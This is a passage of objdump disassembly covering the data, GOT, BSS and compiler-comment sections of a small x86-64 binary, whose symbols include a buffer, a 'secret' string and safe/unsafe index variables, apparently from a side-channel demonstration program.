  201f37:	00 f0                	add    %dh,%al
  201f39:	ff                   	(bad)  
  201f3a:	ff 6f 00             	ljmp   *0x0(%rdi)
  201f3d:	00 00                	add    %al,(%rax)
  201f3f:	00 20                	add    %ah,(%rax)
  201f41:	04 00                	add    $0x0,%al
  201f43:	00 00                	add    %al,(%rax)
  201f45:	00 00                	add    %al,(%rax)
  201f47:	00 f9                	add    %bh,%cl
  201f49:	ff                   	(bad)  
  201f4a:	ff 6f 00             	ljmp   *0x0(%rdi)
  201f4d:	00 00                	add    %al,(%rax)
  201f4f:	00 05 00 00 00 00    	add    %al,0x0(%rip)        # 201f55 <_DYNAMIC+0x19d>
	...

Disassembly of section .got:

0000000000201fa8 <_GLOBAL_OFFSET_TABLE_>:
  201fa8:	b8 1d 20 00 00       	mov    $0x201d,%eax
	...
  201fbd:	00 00                	add    %al,(%rax)
  201fbf:	00 c6                	add    %al,%dh
  201fc1:	05 00 00 00 00       	add    $0x0,%eax
  201fc6:	00 00                	add    %al,(%rax)
  201fc8:	d6                   	(bad)  
  201fc9:	05 00 00 00 00       	add    $0x0,%eax
  201fce:	00 00                	add    %al,(%rax)
  201fd0:	e6 05                	out    %al,$0x5
	...

Disassembly of section .data:

0000000000202000 <__data_start>:
	...

0000000000202008 <__dso_handle>:
  202008:	08 20                	or     %ah,(%rax)
  20200a:	20 00                	and    %al,(%rax)
	...

0000000000202020 <bufferSize>:
  202020:	10 00                	adc    %al,(%rax)
	...

0000000000202024 <bufferSizeMask>:
  202024:	0f 00 00             	sldt   (%rax)
	...

0000000000202040 <buffer>:
  202040:	01 02                	add    %eax,(%rdx)
  202042:	03 04 05 06 07 08 09 	add    0x9080706(,%rax,1),%eax
  202049:	0a 0b                	or     (%rbx),%cl
  20204b:	0c 0d                	or     $0xd,%al
  20204d:	0e                   	(bad)  
  20204e:	0f 10 00             	movups (%rax),%xmm0
	...

00000000002020e0 <secret>:
  2020e0:	54                   	push   %rsp
  2020e1:	68 65 20 4d 61       	pushq  $0x614d2065
  2020e6:	67 69 63 20 57 6f 72 	imul   $0x64726f57,0x20(%ebx),%esp
  2020ed:	64 
  2020ee:	73 20                	jae    202110 <x_is_safe>
  2020f0:	61                   	(bad)  
  2020f1:	72 65                	jb     202158 <array+0x18>
  2020f3:	20 53 71             	and    %dl,0x71(%rbx)
  2020f6:	75 65                	jne    20215d <array+0x1d>
  2020f8:	61                   	(bad)  
  2020f9:	6d                   	insl   (%dx),%es:(%rdi)
  2020fa:	69 73 68 20 4f 73 73 	imul   $0x73734f20,0x68(%rbx),%esi
  202101:	69 66 72 61 67 65 2e 	imul   $0x2e656761,0x72(%rsi),%esp
  202108:	00 00                	add    %al,(%rax)
	...

000000000020210c <one>:
  20210c:	01 00                	add    %eax,(%rax)
	...

0000000000202110 <x_is_safe>:
  202110:	0c 21                	or     $0x21,%al
  202112:	20 00                	and    %al,(%rax)
  202114:	00 00                	add    %al,(%rax)
	...

0000000000202118 <x_is_unsafe>:
  202118:	28 21                	sub    %ah,(%rcx)
  20211a:	20 00                	and    %al,(%rax)
  20211c:	00 00                	add    %al,(%rax)
	...

Disassembly of section .bss:

0000000000202120 <__bss_start>:
  202120:	00 00                	add    %al,(%rax)
	...

0000000000202124 <temp>:
  202124:	00 00                	add    %al,(%rax)
	...

0000000000202128 <zero>:
	...

0000000000202140 <array>:
	...

Disassembly of section .comment:

0000000000000000 <.comment>:
   0:	47                   	rex.RXB
   1:	43                   	rex.XB
   2:	43 3a 20             	rex.XB cmp (%r8),%spl
   5:	28 55 62             	sub    %dl,0x62(%rbp)
   8:	75 6e                	jne    78 <_init-0x518>
   a:	74 75                	je     81 <_init-0x50f>
   c:	20 37                	and    %dh,(%rdi)
   e:	2e 34 2e             	cs xor $0x2e,%al
  11:	30 2d 31 75 62 75    	xor    %ch,0x75627531(%rip)        # 75627548 <_end+0x75325408>
  17:	6e                   	outsb  %ds:(%rsi),(%dx)
  18:	74 75                	je     8f <_init-0x501>
  1a:	31 7e 31             	xor    %edi,0x31(%rsi)
  1d:	38 2e                	cmp    %ch,(%rsi)
  1f:	30 34 2e             	xor    %dh,(%rsi,%rbp,1)
  22:	31 29                	xor    %ebp,(%rcx)
  24:	20 37                	and    %dh,(%rdi)
  26:	2e 34 2e             	cs xor $0x2e,%al
  29:	30 00                	xor    %al,(%rax)
